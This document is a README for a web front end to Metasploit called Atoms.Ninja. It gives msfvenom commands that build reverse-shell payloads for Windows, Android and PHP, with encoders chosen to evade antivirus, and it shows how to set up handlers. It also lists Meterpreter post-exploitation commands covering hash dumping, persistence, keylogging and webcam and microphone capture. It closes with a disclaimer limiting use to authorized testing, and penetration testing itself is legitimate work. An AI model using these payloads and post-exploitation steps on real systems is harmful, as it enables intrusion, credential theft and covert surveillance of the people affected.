# Metasploit Integration - Atoms.Ninja

## Overview
Full Metasploit Framework integration for your security testing needs. Generate payloads, set up listeners, and manage exploit sessions directly from the web interface.

## Features

### 🎯 Payload Generator
Generate custom payloads for various platforms and formats:

**Supported Platforms:**
- Windows (x86/x64)
- Linux (x86/x64)
- Android
- PHP/JSP/Python (Web)
- macOS

**Supported Formats:**
- EXE (Windows Executable)
- ELF (Linux Binary)
- APK (Android Package)
- WAR (Java Web Archive)
- RAW (Binary)
- PowerShell Script
- Python Script
- VBA Macro
- C Language

**Encoders Available:**
- x86/shikata_ga_nai (Excellent)
- x64/zutto_dekiru (Excellent)
- x86/call4_dword_xor (Good)
- cmd/powershell_base64

### 👂 Listener Manager
Set up and manage Metasploit handlers:

**Handler Types:**
- Multi Handler (Universal)
- Rejetto HFS Exploit
- EternalBlue (MS17-010)
- Custom handlers

**Payload Support:**
- Windows Meterpreter (TCP/HTTPS)
- Linux Meterpreter
- Android Meterpreter
- PHP/Python Meterpreter

### 📦 Payload Management
- Download generated payloads
- Track payload history
- View payload details
- Delete old payloads

## Usage

### Generate a Payload

1. Navigate to `/metasploit.html`
2. Select your payload type (e.g., `windows/meterpreter/reverse_tcp`)
3. Choose output format (e.g., `exe`)
4. Enter your LHOST (attacker IP)
5. Set LPORT (listening port, default: 4444)
6. Optional: Select encoder and iterations
7. Click "Generate Payload"

**Example Configuration:**
```
Payload: windows/meterpreter/reverse_tcp
Format: exe
LHOST: 192.168.1.100
LPORT: 4444
Encoder: x86/shikata_ga_nai
Iterations: 3
```

### Set Up a Listener

1. In the Listener Manager section
2. Select handler type (usually `exploit/multi/handler`)
3. Choose matching payload
4. Enter listen IP (0.0.0.0 for all interfaces)
5. Set listen port (must match payload LPORT)
6. Click "Start Listener"

**Example Listener:**
```
Handler: exploit/multi/handler
Payload: windows/meterpreter/reverse_tcp
Listen IP: 0.0.0.0
Listen Port: 4444
```

### Download Payloads

Generated payloads are stored on the server at `/tmp/` by default.

**Download Methods:**

**Via SCP:**
```bash
scp user@server:/tmp/payload_timestamp.exe ./payload.exe
```

**Via HTTP (if web server enabled):**
```bash
wget http://your-server/tmp/payload_timestamp.exe
curl -O http://your-server/tmp/payload_timestamp.exe
```

**Via Netcat:**
```bash
# On server
cat /tmp/payload.exe | nc -l 8000

# On client
nc server-ip 8000 > payload.exe
```

## API Endpoints

### Generate Payload
```bash
POST /api/tools/msfvenom
Content-Type: application/json

{
  "payload": "windows/meterpreter/reverse_tcp",
  "lhost": "192.168.1.100",
  "lport": "4444",
  "format": "exe",
  "encoder": "x86/shikata_ga_nai",
  "iterations": 3,
  "output": "/tmp/payload.exe"
}
```

### Start Handler
```bash
POST /api/tools/msf-handler
Content-Type: application/json

{
  "handler": "exploit/multi/handler",
  "payload": "windows/meterpreter/reverse_tcp",
  "lhost": "0.0.0.0",
  "lport": "4444",
  "action": "start"
}
```

### List Sessions
```bash
POST /api/tools/msf-handler
Content-Type: application/json

{
  "action": "sessions"
}
```

### Execute Metasploit Command
```bash
POST /api/tools/metasploit
Content-Type: application/json

{
  "command": "search type:exploit platform:windows"
}
```

### Search Exploits
```bash
POST /api/tools/searchsploit
Content-Type: application/json

{
  "query": "windows smb",
  "options": "-t"
}
```

## Command Line Usage

If you prefer direct CLI access:

### msfvenom
```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# PowerShell one-liner
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd
```

### msfconsole
```bash
# Start console
msfconsole

# Quick handler setup
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z

# List active sessions
sessions -l

# Interact with session
sessions -i 1

# Background session
background
```

### searchsploit
```bash
# Search for exploits
searchsploit windows smb
searchsploit apache 2.4

# Show exploit details
searchsploit -x exploits/windows/remote/1234.rb

# Copy exploit
searchsploit -m exploits/windows/remote/1234.rb
```

## Meterpreter Commands

Once you have an active Meterpreter session:

### Information Gathering
```
sysinfo                    # System information
getuid                     # Current user
ps                         # List processes
ipconfig / ifconfig        # Network config
route                      # Routing table
```

### File Operations
```
pwd                        # Current directory
ls                         # List files
cd                         # Change directory
download file.txt          # Download file
upload file.txt            # Upload file
search -f *.doc            # Search files
```

### Privilege Escalation
```
getsystem                  # Attempt privilege escalation
getprivs                   # Show current privileges
run post/windows/gather/hashdump  # Dump password hashes
```

### Persistence
```
run persistence -X         # Add to startup
run metsvc                 # Install Metasploit service
```

### Post-Exploitation
```
screenshot                 # Take screenshot
webcam_snap                # Capture webcam
record_mic                 # Record audio
keyscan_start              # Start keylogger
keyscan_dump               # Dump keystrokes
migrate PID                # Migrate to another process
```

### Network
```
portfwd add -l 8080 -p 80 -r target  # Port forwarding
route add 192.168.2.0 255.255.255.0 1  # Add route
```

## Security Best Practices

⚠️ **Important Security Notes:**

1. **Authorization Required**: Only use on systems you own or have explicit permission to test
2. **Isolate Testing**: Use isolated lab environments
3. **Secure Payloads**: Generated payloads contain your IP - handle securely
4. **Clean Up**: Remove test payloads after engagements
5. **Log Everything**: Maintain detailed logs of all activities
6. **Encrypted Transport**: Use HTTPS payloads when possible
7. **AV Evasion**: Encoders help but may still be detected
8. **Legal Compliance**: Ensure all testing is authorized and legal

## Troubleshooting

### Payload Not Executing
- Check antivirus/firewall on target
- Try different encoder
- Use encrypted payload (HTTPS)
- Check architecture (x86 vs x64)

### Listener Not Receiving Connections
- Verify firewall allows incoming connections
- Check LHOST is correct (must be reachable from target)
- Ensure LPORT matches payload
- Verify no other service using the port

### Session Dies Immediately
- Antivirus may be killing it
- Try migrating to stable process
- Use staged payload instead of stageless
- Check network stability

### Meterpreter Commands Not Working
- Session may be unstable
- Try restarting session
- Check target OS compatibility
- Verify payload matches target architecture

## Resources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Documentation](https://docs.rapid7.com/metasploit/)
- [Meterpreter Basic Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [Payload Types Explained](https://www.offensive-security.com/metasploit-unleashed/payload-types/)

## License & Disclaimer

This tool is for **authorized security testing only**. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws.

---

**Built with ❤️ by Atoms.Ninja**
